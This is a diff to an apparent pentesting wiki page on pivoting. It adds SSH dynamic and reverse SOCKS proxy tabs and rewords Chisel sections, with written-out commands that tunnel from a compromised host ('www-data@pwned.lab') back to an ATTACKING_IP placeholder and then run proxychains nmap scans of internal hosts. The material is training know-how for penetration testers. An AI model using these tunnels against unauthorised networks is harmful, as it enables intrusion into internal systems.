@@ -12,8 +12,8 @@ There are two main types of port forwarding: local and remote.
 
 * **Local port forwarding**:  Open a local port on the compromised server and redirect incoming traffic to an other port on the same host or a different host in a remote network.
 * **Remote port forwarding**: Open a local port on our attacking server and redirect incoming traffic to a port on a remote machine through a compromised intermediary machine (the jump box).
-* **Dynamic port forwarding (Forward Proxy)**: tunnel the whole attacker's network traffic (instead of only one port) through a remote machine. See the [Chisel](portfwd.md#chisel) section.
-* **Reverse dynamic port forwarding (Reverse Proxy)**: tunnel the whole network traffic from a remote machine through the attacker's machine. See the [Chisel](portfwd.md#chisel) section.
+* **Dynamic port forwarding (Forward Proxy)**: tunnel the whole attacker's network traffic (instead of only one port) through a remote machine.
+* **Remote dynamic port forwarding (Reverse Proxy)**: tunnel the whole network traffic from a remote machine through the attacker's machine.
 
 <figure><img src="../../.gitbook/assets/PortFrwd.png" alt=""><figcaption><p>Example of Network layout in a Classic Port Forwarding Scenario  </p></figcaption></figure>
 
@@ -25,13 +25,15 @@ By using a SSH client with an OpenSSH server, it's possible to create both forwa
 
 * **SSH Local Forwarding:** It redirects a specific port from the server we connect to via SSH back to the client. Basically, the SSH client listens for connections on a configured port, and when it receives a connection, it tunnels the connection to the SSH server. Then, the server connects to a configured destination port, possibly on a different machine than the SSH server.
 * **SHH Remote forwarding:** Allows a client machine of an SSH connection to redirect one of its ports to a port on the server, or to redirect a port of a network machine from the SSH server to a port local to the server.
+* **SSH Dynamic port forwarding (Forward Proxy)**: The SSH client creates a local SOCKS proxy server port.
+* **SSH Reverse dynamic port forwarding (Reverse Proxy)**: The SSH client creates a remote SOCKS proxy server port on the SSH server.
 
 {% hint style="info" %}
 Microsoft has introduced its native implementation of the OpenSSH server for Windows. So this technique may works with both UNIX and Windows servers/clients.
 {% endhint %}
 
 {% tabs %}
-{% tab title="SSH Local Forwarding" %}
+{% tab title="Local Forwarding" %}
 This example opens a connection to the jump-server.net, and forwards any connection to port 80 on the local machine (attacking machine) to port 80 of intra.example.com.
 
 ```bash
@@ -43,7 +45,7 @@ veresk@kali$ ssh -L *:80:intra.example.com:80 user@jump-server.net -fN
 ```
 {% endtab %}
 
-{% tab title="SSH Remote Forwarding" %}
+{% tab title="Remote Forwarding" %}
 On the compromised computer (jump-box), we can connect back to the attacking machine with a reverse port forward using the following command, this example produce the same result as previously seen with Local-Forwarding. Any connection on `ATTACKING_IP:8000` will be redirected on `intra.example.com:80`
 
 ```bash
@@ -62,14 +64,56 @@ passwd tunneluser
 {% hint style="info" %}
 Ensure to generate SSH keys for the tunnel user, and subsequently, add the generated public key to both the `authorized_keys` file and the jump box.
 {% endhint %}
+{% endtab %}
 
-In newer versions of the SSH client, it is also possible to create a **reverse proxy** (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it.
+{% tab title="Forward Proxy" %}
+its possible to create a **Dynamic Port Forwarding (Forward proxy)** using SSH.&#x20;
+
+For example, by using the following command on our attacking host, SOCKS port `9090` will be opened on our attacking machine. Traffic sent via this port will be routed to the jump box SSH connection.
 
 ```bash
-PC> ssh -D 9090 tunneluser@ATTACKING_IP -fN
+# -D : dynamic port forward
+# [BIND_IP:BIND_PORT]
+v4resk@kali$ ssh -D 127.0.0.1:9090 user@jump-server.net -fN
 ```
 
-See the [Chisel](portfwd.md#chisel) section on the [port forwarding page](portfwd.md) if you don't know how to use this proxy connection.
+Once configured, you can use `proxychains` to run applications through the proxy network connections.
+
+```bash
+v4resk@kali$ proxychains nmap -sS <IP_ACCESSIBLE_FROM_JUMP_BOX>
+```
+
+{% hint style="info" %}
+A little reminder on how to config ProxyChains. In this example, we just have to add the following line to `/etc/proxychains.conf`:
+
+```bash
+socks5 127.0.0.1 9090
+```
+{% endhint %}
+{% endtab %}
+
+{% tab title="Reverse Proxy" %}
+In newer versions of the SSH client, it is also possible to create a **Reverse Proxy** (the equivalent of the `-D` switch used in local connections). This **may not work in older clients**, but this command can be used to create a reverse proxy in clients which do support it.
+
+By using this command on the compromised host (jump-box), SOCKS port `9090` will be opened on our attacking machine. Traffic sent via this port will be routed to the jump-box SSH connection.
+
+```bash
+PC> ssh -R 9090 tunneluser@ATTACKING_IP -fN
+```
+
+Once configured, you can use `proxychains` to run applications through the proxy network connections.
+
+```bash
+v4resk@kali$ proxychains nmap -sS <IP_ACCESSIBLE_FROM_JUMP_BOX>
+```
+
+{% hint style="info" %}
+A little reminder on how to config ProxyChains. In this example, we just have to add the following line to `/etc/proxychains.conf`:
+
+```bash
+socks5 127.0.0.1 9090
+```
+{% endhint %}
 {% endtab %}
 {% endtabs %}
 
@@ -124,7 +168,7 @@ This method doesn't require opening up a port externally on the compromised serv
 
 {% tabs %}
 {% tab title="Reverse Proxy" %}
-Setting up a **reverse proxy** involves connecting from the compromised server to a listener on the attacking machine. Then we will be able to access any network resources accesible for the compromised host, directly from our attacking host.
+Setting up a **Reverse Proxy** involves connecting from the compromised server to a listener on the attacking machine. Then, the Chisel client creates a remote SOCKS proxy server port on the Chisel Server.
 
 On the attacking host:
 
@@ -138,7 +182,7 @@ On the compromised host, we use the following command:
 www-data@pwned.lab$ ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
 ```
 
-Once configured, you can use `proxychains` to run applications using proxy network connections.
+Once configured, you can use `proxychains` to run applications through the proxy network connection.
 
 ```bash
 proxychains nmap -sS <IP_ACCESSIBLE_FROM_JUMP_BOX>
@@ -153,8 +197,10 @@ socks5 127.0.0.1 1080
 {% endhint %}
 {% endtab %}
 
-{% tab title="Forward Proxy" %}
-Setting up a **forward proxy** with Chisel is straightforward. On the compromised host, we would use the following command:
+{% tab title="Local Proxy" %}
+Setting up a **Forward Proxy** involves connecting from the attacking host to a listener on the compromised machine (jump box). Then, the Chisel client creates a local SOCKS proxy server port.
+
+On the compromised host, we would use the following command:
 
 ```bash
 www-data@pwned.lab$ ./chisel server -p LISTEN_PORT --socks5
@@ -166,7 +212,7 @@ On the attacking host, using the following command, we will open the local `PROX
 v4resk@kali$ ./chisel client TARGET_IP:LISTEN_PORT LOCAL_PROXY_PORT:socks
 ```
 
-Like with the reverse proxy, you can use `proxychains` to run applications using this proxy network connections.
+Like with the reverse proxy, you can use `proxychains` to run applications through the proxy network connection.
 
 {% hint style="info" %}
 **Forward proxies are less common than reverse proxies** for the same reason as why reverse shells are more prevalent than bind shells. In broad terms, outbound traffic managed by egress firewalls tends to be subjected to less strict controls than inbound connections regulated by ingress firewalls.
